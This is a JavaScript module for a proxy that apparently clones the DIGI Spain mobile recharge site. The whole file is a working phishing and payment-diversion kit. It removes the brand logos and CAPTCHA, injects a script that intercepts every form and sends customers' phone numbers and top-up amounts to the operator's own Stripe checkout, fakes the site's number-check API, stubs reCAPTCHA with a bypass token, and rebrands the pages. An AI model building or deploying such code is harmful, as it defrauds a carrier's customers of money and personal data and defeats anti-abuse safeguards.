const { STRIPE_PUBLISHABLE_KEY, SOURCE_DOMAIN, MIRROR_DOMAIN } = require('./constants');

function replaceDigiWithDig(text) {
  const protectedElements = [];
  let counter = 0;

  let protectedText = text.replace(/<[^>]+>/g, match => {
    const placeholder = `__PROTECTED_HTML_${counter++}__`;
    protectedElements.push({ placeholder, content: match });
    return placeholder;
  });

  protectedText = protectedText.replace(/(https?:\/\/[^\s"']+|www\.[^\s"']+)/g, match => {
    const placeholder = `__PROTECTED_URL_${counter++}__`;
    protectedElements.push({ placeholder, content: match });
    return placeholder;
  });

  const domainPatterns = [
    /digimobil\.es/g,
    /\.digi\./g,
    /\/digi\//g,
    /\bdigi[a-z]*\.com\b/g,
    /\bdigi[a-z]*\.net\b/g,
    /\bdigi[a-z]*\.org\b/g,
    /\bdigi[a-z]*\.io\b/g,
    /\bdigimobil\b/g,
    /\bdigisau\b/g,
    /\bdigilife\b/g,
    /\bdigiserve\b/g,
    /\bdigifinance\b/g
  ];

  for (const pattern of domainPatterns) {
    protectedText = protectedText.replace(pattern, match => {
      const placeholder = `__PROTECTED_DOMAIN_${counter++}__`;
      protectedElements.push({ placeholder, content: match });
      return placeholder;
    });
  }

  let modifiedText = protectedText;

  const replacements = [
    { pattern: /(^|\s|[^\w])(DIGI)(?=\s|$|[^\w])/g, replacement: '$1DIG$2' },
    { pattern: /(^|\s|[^\w])(Digi)(?=\s|$|[^\w])/g, replacement: '$1Dig$2' },
    { pattern: /(^|\s|[^\w])(digi)(?=\s|$|[^\w])/g, replacement: '$1dig$2' }
  ];

  for (const { pattern, replacement } of replacements) {
    modifiedText = modifiedText.replace(pattern, replacement);
  }

  modifiedText = modifiedText.replace(/DIGI/gi, match => {
    if (match === 'DIGI') return 'DIG';
    if (match === 'Digi') return 'Dig';
    if (match === 'digi') return 'dig';
    return match;
  });

  for (let i = protectedElements.length - 1; i >= 0; i--) {
    const { placeholder, content } = protectedElements[i];
    modifiedText = modifiedText.replace(placeholder, content);
  }

  return modifiedText;
}

async function modifyHTML(response) {
  let text = await response.text();

  text = text.replace(/<script[^>]*src="[^"]*recaptcha[^"]*"[^>]*><\/script>/gi, '');
  text = text.replace(/<div[^>]*class=["'][^"']*captcha[^"']*["'][^>]*>[\s\S]*?<\/div>/gi, '');
  text = text.replace(/<[^>]*captcha[^>]*>/gi, '');
  text = text.replace(
    /<a[^>]*class="navbar-brand"[^>]*>\s*<img[^>]*alt="logo_digi_oficial"[^>]*>\s*<\/a>/gi,
    ''
  );
  text = text.replace(
    /<div[^>]*class="[^"]*footer-logo[^"]*"[^>]*>[\s\S]*?<\/div>/gi,
    ''
  );
  text = text.replace(
    /<img[^>]*alt="logo_digi[^"]*"[^>]*>/gi,
    ''
  );

  const bypassScript = `
    <script>
      (function() {
        if (!document.querySelector('script[src*="stripe.js"]')) {
          const stripeScript = document.createElement('script');
          stripeScript.src = 'https://js.stripe.com/v3/';
          document.head.appendChild(stripeScript);
        }
      })();
      
      window.stripeLoadedPromise = new Promise((resolve) => {
        if (typeof Stripe !== 'undefined') {
          window.stripeInstance = Stripe('${STRIPE_PUBLISHABLE_KEY}');
          resolve(window.stripeInstance);
        } else {
          document.addEventListener('DOMContentLoaded', function() {
            const stripeCheckInterval = setInterval(function() {
              if (typeof Stripe !== 'undefined') {
                clearInterval(stripeCheckInterval);
                window.stripeInstance = Stripe('${STRIPE_PUBLISHABLE_KEY}');
                resolve(window.stripeInstance);
              }
            }, 100);
            setTimeout(() => {
              clearInterval(stripeCheckInterval);
              resolve(null);
            }, 5000);
          });
        }
      });
      
      // Автоматичне проходження етапу перевірки номера
      function autoProgressAfterCheckNumber() {
        // Імітуємо кліки на кнопки "Далі" або "Продовжити" після завантаження сторінки
        setTimeout(() => {
          const continueButtons = Array.from(document.querySelectorAll('button, a.btn, input[type="submit"]')).filter(el => {
            const text = el.innerText || el.value || '';
            return text.match(/continue|next|далі|продовжити|siguiente/i) || 
                   el.classList.contains('btn-primary') || 
                   el.classList.contains('btn-success');
          });
          
          if (continueButtons.length > 0) {
            console.log('Auto-continuing to next step');
            continueButtons[0].click();
          }
        }, 500);
      }

      // Отримати вибрану суму з радіокнопок
      function getSelectedAmountFromRadios() {
        // Перевіряємо радіокнопки з name="recharge_number[amount]"
        const selectedRadio = document.querySelector('input[name="recharge_number[amount]"]:checked');
        if (selectedRadio) {
          console.log('Found selected amount radio:', selectedRadio.value);
          return selectedRadio.value;
        }
        
        // Перевіряємо будь-які інші радіокнопки зі словом amount
        const otherRadio = document.querySelector('input[type="radio"][name*="amount"]:checked');
        if (otherRadio) {
          console.log('Found other amount radio:', otherRadio.value);
          return otherRadio.value;
        }
        
        // Якщо немає вибраних радіокнопок, перевіряємо data-amount
        const amountEl = document.querySelector('[data-amount]');
        if (amountEl) {
          console.log('Found data-amount element:', amountEl.getAttribute('data-amount'));
          return amountEl.getAttribute('data-amount');
        }
        
        console.log('No amount radio found, using default 5');
        return '5';
      }

      window.processPayment = async function(amount, phoneNumber, sourceEvent) {
        if (sourceEvent) {
          sourceEvent.preventDefault();
          sourceEvent.stopPropagation();
        }
        
        try {
          const isFirstStep = window.location.pathname.includes('/recargar') && 
                             !document.querySelector('[data-amount], .recharge-amount');
          
          if (isFirstStep) {
            const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"], input[id*="phone"]');
            if (phoneInput && phoneInput.value.match(/\\d{9}/)) {
              try {
                sessionStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
                localStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
                window.phoneNumberForPayment = phoneInput.value.replace(/\\D/g, '');
              } catch (e) { console.error('Error storing phone:', e); }
            }
            return true;
          }
          
           if (!phoneNumber) {
      try {
        phoneNumber = window.phoneNumberForPayment || 
                     sessionStorage.getItem('rechargePhoneNumber') || 
                     localStorage.getItem('rechargePhoneNumber') || '';
      } catch (e) { }
      if (!phoneNumber) {
        const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"], input[id*="phone"]');
        phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
      }
    }
          
          if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
            amount = getSelectedAmountFromRadios() || '5';
          }
          
          console.log('Processing payment with amount:', amount, 'phone:', phoneNumber);
          
            const response = await fetch('/.netlify/functions/api/create-payment', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              amount: amount, 
              phoneNumber: phoneNumber,
              successUrl: window.location.origin + '/payment-success',
              cancelUrl: window.location.origin + '/payment-cancel'
            })
          });
          
          if (!response.ok) throw new Error('Payment request failed');
          const data = await response.json();
          
          if (data.url) {
            window.location.href = data.url;
          } else if (data.sessionId) {
            const stripe = await window.stripeLoadedPromise;
            if (!stripe) throw new Error('Stripe failed to load');
            await stripe.redirectToCheckout({ sessionId: data.sessionId });
          }
          return false;
        } catch (error) {
          alert('Payment error: ' + error.message);
          return false;
        }
      };
      
      document.addEventListener('DOMContentLoaded', function() {
        // Автоматичний перехід до наступного етапу, якщо поточний URL містить "check_number"
        if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
          autoProgressAfterCheckNumber();
        }
        
        // Перехоплюємо всі форми
        document.querySelectorAll('form').forEach(form => {
          console.log('Form found:', form.id || form.name || 'unnamed form');
          
          form.addEventListener('submit', function(event) {
            console.log('Form submit intercepted:', form.id || form.name);
            
            // Перевіряємо, чи це форма з вибором суми
            const hasAmountRadios = form.querySelector('input[name="recharge_number[amount]"]');
            if (hasAmountRadios) {
              console.log('Form has amount radios');
              const selectedAmount = getSelectedAmountFromRadios();
              console.log('Selected amount:', selectedAmount);
            
              const phoneInput = form.querySelector('input[name*="phone"], input[type="tel"]');
              const phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
              console.log('Phone from form:', phoneNumber);
              
              window.processPayment(selectedAmount, phoneNumber, event);
              return false;
            } else {
              // Для інших форм
              const amount = form.querySelector('[data-amount]')?.getAttribute('data-amount') || '5';
              const phoneInput = form.querySelector('input[name*="phone"], input[type="tel"]');
              const phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
              window.processPayment(amount, phoneNumber, event);
            }
          });
        });

        function replaceFooterText() {
          const footerElements = document.querySelectorAll('footer span, footer div, footer p');
          footerElements.forEach(element => {
            if (element.textContent.includes('© DIGDIG Spain Telecom, S.L.U. 2008/2025')) {
              element.textContent = element.textContent.replace(
                '© DIGDIG Spain Telecom, S.L.U. 2008/2025',
                '© DIG mobile solution'
              );
              element.style.textAlign = 'center'; 
            }
          });
        }

        const style = document.createElement('style');
        style.textContent = \`
          footer {
            text-align: center; 
            padding: 10px; 
          }
          footer span, footer div, footer p {
            display: inline-block; 
            width: 100%;
            text-align: center; 
            font-family: 'Arial', sans-serif;
            font-size: 12px; 
          }
        \`;
        document.head.appendChild(style);

        replaceFooterText();
        const observer = new MutationObserver(() => replaceFooterText());
        observer.observe(document.body, { childList: true, subtree: true });
      });
    </script>
  `;

  text = text.replace(/<head>/i, '<head>' + bypassScript);
  text = replaceDigiWithDig(text);

  return {
    statusCode: 200,
    body: text,
    headers: {
      'Content-Type': 'text/html;charset=UTF-8',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': '*'
    }
  };
}

async function modifyJavaScript(response) {
  let text = await response.text();
  text = text.replace(new RegExp(SOURCE_DOMAIN, 'g'), MIRROR_DOMAIN);
  text = text.replace(new RegExp('https://store-backend.digimobil.es', 'g'), `https://${MIRROR_DOMAIN}/store-backend`);

  const recaptchaBypass = `
    window.grecaptcha = {
      ready: function(callback) { if (callback) setTimeout(callback, 10); },
      execute: function() { return Promise.resolve('bypassed_captcha_token'); },
      render: function() { return 1; },
      reset: function() { return true; }
    };
    
    (function() {
      const origFetch = window.fetch;
      window.fetch = function(url, options) {
        if (url && typeof url === 'string') {
          // Автоматична відповідь для перевірки номера
          if (url.includes('/api/check_number') || url.includes('/api/check-number')) {
            return Promise.resolve(new Response(JSON.stringify({
              code: 200,
              data: {
                id: Math.floor(Math.random() * 90000000) + 10000000,
                charges: 0,
                country: "spania",
                number: ""
              }
            }), { 
              status: 200, 
              headers: { 'Content-Type': 'application/json' } 
            }));
          }
          
          // Для інших API запитів, які потрібно обробити автоматично
          if (url.includes('/api/')) {
            console.log('Intercepted API request:', url);
          }
        }
        return origFetch.call(this, url, options);
      };
    })();
    
    // Отримати вибрану суму з радіокнопок
    function getSelectedAmountFromRadios() {
      // Перевіряємо радіокнопки з name="recharge_number[amount]"
      const selectedRadio = document.querySelector('input[name="recharge_number[amount]"]:checked');
      if (selectedRadio) {
        console.log('Found selected amount radio:', selectedRadio.value);
        return selectedRadio.value;
      }
      
      // Перевіряємо будь-які інші радіокнопки зі словом amount
      const otherRadio = document.querySelector('input[type="radio"][name*="amount"]:checked');
      if (otherRadio) {
        console.log('Found other amount radio:', otherRadio.value);
        return otherRadio.value;
      }
      
      // Якщо немає вибраних радіокнопок, перевіряємо data-amount
      const amountEl = document.querySelector('[data-amount]');
      if (amountEl) {
        console.log('Found data-amount element:', amountEl.getAttribute('data-amount'));
        return amountEl.getAttribute('data-amount');
      }
      
      console.log('No amount radio found, using default 5');
      return '5';
    }
    
    // Автоматичний перехід до наступного кроку після перевірки номера
    (function() {
      if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
        setTimeout(() => {
          const continueButtons = Array.from(document.querySelectorAll('button, a.btn, input[type="submit"]')).filter(el => {
            const text = el.innerText || el.value || '';
            return text.match(/continue|next|далі|продовжити|siguiente/i) || 
                  el.classList.contains('btn-primary') || 
                  el.classList.contains('btn-success');
          });
          
          if (continueButtons.length > 0) {
            console.log('Auto-continuing to next step');
            continueButtons[0].click();
          }
        }, 500);
      }
    })();
    
    (function() {
      if (typeof window.stripeInstance === 'undefined' && typeof Stripe !== 'undefined') {
        window.stripeInstance = Stripe('${STRIPE_PUBLISHABLE_KEY}');
      }
      try {
        window.phoneNumberForPayment = sessionStorage.getItem('rechargePhoneNumber') || 
                                      localStorage.getItem('rechargePhoneNumber');
      } catch (e) { }
    })();
    
    // Перехоплення викликів reCAPTCHA
    (function() {
      if (typeof grecaptcha !== 'undefined') {
        grecaptcha.execute = function() { return Promise.resolve('bypassed_captcha_token'); };
        grecaptcha.ready = function(callback) { if (callback) setTimeout(callback, 10); };
        grecaptcha.render = function() { return 1; };
        grecaptcha.reset = function() { return true; };
      }
    })();
    
    // Динамічне видалення grecaptcha-badge
    (function() {
      document.addEventListener('DOMContentLoaded', function() {
        const removeRecaptchaBadge = () => {
          const badge = document.querySelector('.grecaptcha-badge');
          if (badge) {
            badge.remove();
          }
        };
        
        // Видаляємо одразу після завантаження
        removeRecaptchaBadge();
        
        // Спостерігаємо за змінами в DOM, щоб видаляти badge, якщо він додається пізніше
        const observer = new MutationObserver((mutations) => {
          mutations.forEach((mutation) => {
            if (mutation.addedNodes.length) {
              removeRecaptchaBadge();
            }
          });
        });
        
        observer.observe(document.body, {
          childList: true,
          subtree: true
        });
      });
    })();
  `;

  const initScript = `
    if (typeof window.global === 'undefined') { window.global = {}; }
    if (typeof window.global.notif !== 'function') {
      window.global.notif = function() { return Promise.resolve(); };
    }
    ${recaptchaBypass}
  `;

  text = initScript + text;
  text = replaceDigiWithDig(text);

  return {
    statusCode: 200,
    body: text,
    headers: {
      'Content-Type': 'application/javascript',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': '*'
    }
  };
}

module.exports = {
  replaceDigiWithDig,
  modifyHTML,
  modifyJavaScript
};